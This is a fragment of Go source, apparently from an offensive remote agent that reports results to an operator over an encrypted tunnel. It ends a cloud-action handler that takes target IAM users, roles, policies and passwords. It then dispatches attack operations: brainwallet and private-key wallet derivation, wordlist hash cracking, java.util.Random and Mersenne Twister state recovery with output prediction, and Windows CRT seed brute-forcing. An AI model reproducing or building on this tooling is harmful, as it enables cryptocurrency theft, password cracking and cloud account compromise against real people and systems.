			TargetUser:   c.TargetUser,
			TargetGroup:  c.TargetGroup,
			PolicyARN:    c.PolicyARN,
			VersionID:    c.VersionID,
			RoleARN:      c.RoleARN,
			SessionName:  c.SessionName,
			Password:     c.Password,
			PolicyName:   c.PolicyName,
			DurationSecs: c.DurationSecs,
		})
		if err != nil {
			send("driver", "driver error", err.Error(), false, false)
			return
		}
		send("driver", "ok", summary, true, false)

	default:
		send("error", "unknown cloud action: "+c.Action, "", false, true)
		return
	}
	send("done", "", "", true, true)
}

// runCryptoOp drives one cryptogo operation on the agent. Streams results
// as CryptoOpData messages. Called via proto.TypeCryptoOpStart.
func runCryptoOp(conn net.Conn, sess *crypto.Session, c proto.CryptoOpStart) {
	send := func(stage, msg, detail string, ok, done bool) {
		sendTunnelAck(conn, sess, proto.TypeCryptoOpData, proto.CryptoOpData{
			SessionID: c.SessionID,
			Stage:     stage,
			Message:   msg,
			Detail:    detail,
			OK:        ok,
			Done:      done,
		})
	}

	switch c.Op {
	case "derive":
		priv := new(big.Int)
		if _, ok := priv.SetString(c.PrivHex, 16); !ok {
			send("error", "bad priv_hex", "", false, true)
			return
		}
		p, w, e, err := cryptogo.Addresses(priv)
		if err != nil {
			send("error", "derive", err.Error(), false, true)
			return
		}
		send("result", "btc-p2pkh", p, true, false)
		send("result", "btc-p2wpkh", w, true, false)
		send("result", "eth", e, true, false)

	case "brainwallet":
		priv := cryptogo.BrainwalletPriv(c.Passphrase)
		p, w, e, err := cryptogo.Addresses(priv)
		if err != nil {
			send("error", "brainwallet", err.Error(), false, true)
			return
		}
		send("result", "priv_hex", cryptogo.PrivHex(priv), true, false)
		send("result", "btc-p2pkh", p, true, false)
		send("result", "btc-p2wpkh", w, true, false)
		send("result", "eth", e, true, false)

	case "hash_id":
		matches := cryptogo.IdentifyHash(c.TargetHash)
		if len(matches) == 0 {
			send("result", "no signature match", "", false, false)
		} else {
			send("result", "matches", fmt.Sprintf("%v", matches), true, false)
		}

	case "hash_crack":
		onProg := func(n int64) {
			send("progress", fmt.Sprintf("%d tried", n), "", true, false)
		}
		res, err := cryptogo.CrackHash(c.Algo, c.TargetHash, c.Wordlist, onProg)
		if err != nil {
			send("error", "crack", err.Error(), false, true)
			return
		}
		if res.Found {
			send("result", "FOUND", fmt.Sprintf("word=%s tried=%d", res.Word, res.Tried), true, false)
		} else {
			send("result", "not found", fmt.Sprintf("tried=%d", res.Tried), false, false)
		}

	case "java_recover":
		st, err := cryptogo.JavaRecoverFromTwoInts(c.JavaA, c.JavaB)
		if err != nil {
			send("error", "java recover", err.Error(), false, true)
			return
		}
		send("result", "state", fmt.Sprintf("0x%x", st), true, false)
		n := c.JavaN
		if n <= 0 {
			n = 10
		}
		pred := cryptogo.JavaPredict(st, n)
		send("result", "next ints", fmt.Sprintf("%v", pred), true, false)

	case "win_brute":
		lo := c.WinLo
		hi := c.WinHi
		if hi == 0 {
			hi = 1 << 24
		}
		cands := cryptogo.WinCRTSeedCandidates(c.WinFirst, lo, hi)
		send("result", "candidates", fmt.Sprintf("%v", cands), len(cands) > 0, false)

	case "mt_recover":
		if len(c.MTObs) < 624 {
			send("error", "mt recover", fmt.Sprintf("need 624 observations, got %d", len(c.MTObs)), false, true)
			return
		}
		st, err := cryptogo.MTUntemperAll(c.MTObs)
		if err != nil {
			send("error", "mt recover", err.Error(), false, true)
			return
		}
		n := c.MTN
		if n <= 0 {
			n = 10
		}
		pred := make([]uint32, 0, n)
		for i := 0; i < n; i++ {
			pred = append(pred, st.Next())
		}
		send("result", "next outputs", fmt.Sprintf("%v", pred), true, false)

	default:
		send("error", "unknown op: "+c.Op, "", false, true)
		return
	}
	send("done", "", "", true, true)
}
